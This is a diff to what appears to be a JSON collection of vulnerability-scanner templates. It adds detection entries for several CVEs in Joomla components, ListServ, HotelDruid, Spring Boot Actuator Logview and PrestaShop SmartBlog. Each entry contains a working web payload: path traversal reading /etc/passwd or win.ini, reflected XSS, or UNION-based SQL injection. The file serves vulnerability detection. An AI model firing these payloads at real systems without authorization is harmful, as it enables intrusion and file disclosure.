@@ -870,6 +870,43 @@
       ]
     },
     {
+      "id": "CVE-2010-1475",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the Preventive & Reservation (com_preventive) component 1.0.5 for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impact via a .. (dot dot) in the controller parameter to index.php.",
+        "name": "Joomla! Component Preventive And Reservation 1.0.5 - Local File Inclusion",
+        "reference": [
+          "https://www.exploit-db.com/exploits/12147",
+          "https://www.cvedetails.com/cve/CVE-2010-1475"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_preventive&controller==../../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2010-1495",
       "info": {
         "author": "daffainfo",
@@ -973,6 +1010,43 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/index.php?option=com_tweetla&controller=../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2010-1535",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the TRAVELbook (com_travelbook) component 1.0.1 for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impact via a .. (dot dot) in the controller parameter to index.php.",
+        "name": "Joomla! Component TRAVELbook 1.0.1 - Local File Inclusion",
+        "reference": [
+          "https://www.exploit-db.com/exploits/12151",
+          "https://www.cvedetails.com/cve/CVE-2010-1535"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_travelbook&controller=../../../../../../../../../../etc/passwd%00"
           ]
         }
       ]
@@ -11648,6 +11722,51 @@
       ]
     },
     {
+      "id": "CVE-2019-15501",
+      "info": {
+        "author": "LogicalHunter",
+        "name": "LSoft ListServ - XSS",
+        "reference": [
+          "https://www.exploit-db.com/exploits/47302",
+          "http://www.lsoft.com/manuals/16.5/LISTSERV16.5-2018a_WhatsNew.pdf",
+          "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-15501"
+        ],
+        "severity": "medium",
+        "tags": "cve,cve2019,xss"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "</script><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/scripts/wa.exe?OK=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2019-15713",
       "info": {
         "author": "daffainfo,dhiyaneshDk",
@@ -13566,6 +13685,41 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/var/www/html/index.html"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2019-8937",
+      "info": {
+        "author": "LogicalHunter",
+        "name": "HotelDruid 2.3.0 - XSS",
+        "refrense": "https://www.exploit-db.com/exploits/46429",
+        "severity": "medium",
+        "tags": "cve,cve2019,xss,hoteldruid"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "\"</script><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/hoteldruid/visualizza_tabelle.php?anno=2019&id_sessione=&tipo_tabella=prenotazioni&subtotale_selezionate=1&num_cambia_pren=1&cerca_id_passati=1&cambia1=3134671%22%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
@@ -20147,9 +20301,14 @@
     {
       "id": "CVE-2021-21234",
       "info": {
-        "author": "gy741",
+        "author": "gy741,pikpikcu",
+        "description": "spring-boot-actuator-logview in a library that adds a simple logfile viewer as spring boot actuator endpoint. It is maven package \"eu.hinsch:spring-boot-actuator-logview\". In spring-boot-actuator-logview before version 0.2.13 there is a directory traversal vulnerability.",
         "name": "Spring Boot Actuator Logview - Directory Traversal",
-        "reference": "https://blogg.pwc.no/styringogkontroll/unauthenticated-directory-traversal-vulnerability-in-a-java-spring-boot-actuator-library-cve-2021-21234",
+        "reference": [
+          "https://blogg.pwc.no/styringogkontroll/unauthenticated-directory-traversal-vulnerability-in-a-java-spring-boot-actuator-library-cve-2021-21234",
+          "https://github.com/cristianeph/vulnerability-actuator-log-viewer",
+          "https://nvd.nist.gov/vuln/detail/CVE-2021-21234"
+        ],
         "severity": "high",
         "tags": "cve,cve2021,springboot,lfi"
       },
@@ -20164,16 +20323,23 @@
               "type": "regex"
             },
             {
-              "status": [
-                200
-              ],
-              "type": "status"
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "bit app support",
+                "fonts",
+                "extensions"
+              ]
             }
           ],
-          "matchers-condition": "and",
+          "matchers-condition": "or",
           "method": "GET",
           "path": [
-            "{{BaseURL}}/log/view?filename=/etc/passwd&base=../../"
+            "{{BaseURL}}/manage/log/view?filename=/windows/win.ini&base=../../../../../../../../../../",
+            "{{BaseURL}}/log/view?filename=/windows/win.ini&base=../../../../../../../../../../",
+            "{{BaseURL}}/manage/log/view?filename=/etc/passwd&base=../../../../../../../../../../",
+            "{{BaseURL}}/log/view?filename=/etc/passwd&base=../../../../../../../../../../"
           ]
         }
       ]
@@ -24027,6 +24193,44 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/http_header.php"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-37538",
+      "info": {
+        "author": "whoever",
+        "description": "PrestaShop SmartBlog by SmartDataSoft < 4.0.6 is vulnerable to a SQL injection in the blog archive functionality.",
+        "name": "PrestaShop SmartBlog SQL Injection",
+        "reference": [
+          "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37538",
+          "https://blog.sorcery.ie/posts/smartblog_sqli/"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2021,prestashop,smartblog,sqli"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "c5fe25896e49ddfe996db7508cf00534"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/module/smartblog/archive?month=1&year=1&day=1%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,(SELECT%20MD5(55555)),NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20-"
           ]
         }
       ]
